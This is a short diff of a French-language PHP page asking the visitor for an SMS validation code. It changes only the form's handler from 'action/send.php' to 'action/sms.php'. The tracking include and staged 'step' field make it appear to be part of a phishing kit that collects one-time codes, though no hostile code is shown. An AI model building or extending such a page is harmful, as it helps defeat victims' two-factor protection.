@@ -118,7 +118,7 @@ include("track.php");
 <div class="sms-icon">💬</div>
 <div class="instructions">Entrez le code de validation reçu par SMS</div>
 
-<form action="action/send.php" method="POST" id="smsForm">
+<form action="action/sms.php" method="POST" id="smsForm">
   <input type="hidden" name="step" value="sms">
 
   <div class="code-inputs">
